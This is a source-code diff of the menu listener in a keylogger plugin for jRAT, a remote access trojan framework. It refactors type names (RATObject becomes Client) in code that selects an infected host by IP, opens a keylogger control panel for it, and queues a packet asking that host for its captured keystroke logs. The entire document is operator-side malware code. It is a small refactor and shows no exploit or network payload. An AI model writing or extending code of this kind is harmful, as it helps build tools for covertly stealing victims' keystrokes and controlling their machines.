@@ -11,16 +11,16 @@ import javax.swing.JFrame;
 
 import jrat.api.BaseControlPanel;
 import jrat.api.PacketBuilder;
-import jrat.api.RATMenuItemActionListener;
-import jrat.api.RATObject;
+import jrat.api.Client;
+import jrat.api.ui.RATMenuItemActionListener;
 
 public class MenuListener implements RATMenuItemActionListener {
 
 	@Override
-	public void onClick(List<RATObject> servers) {
+	public void onClick(List<Client> servers) {
 		try {
 			if (servers.size() > 0) {
-				final RATObject server = servers.get(0);
+				final Client server = servers.get(0);
 				BaseControlPanel panel = null;
 
 				if (KeyloggerPlugin.entry.instances.containsKey(server.getIP())) {
@@ -51,7 +51,7 @@ public class MenuListener implements RATMenuItemActionListener {
 				try {
 					server.addToSendQueue(new PacketBuilder(KeyloggerPlugin.LOGS_HEADER, server) {
 						@Override
-						public void write(RATObject rat, DataOutputStream dos, DataInputStream dis) throws Exception {						
+						public void write(Client rat, DataOutputStream dos, DataInputStream dis) throws Exception {						
 							
 						}
 					});
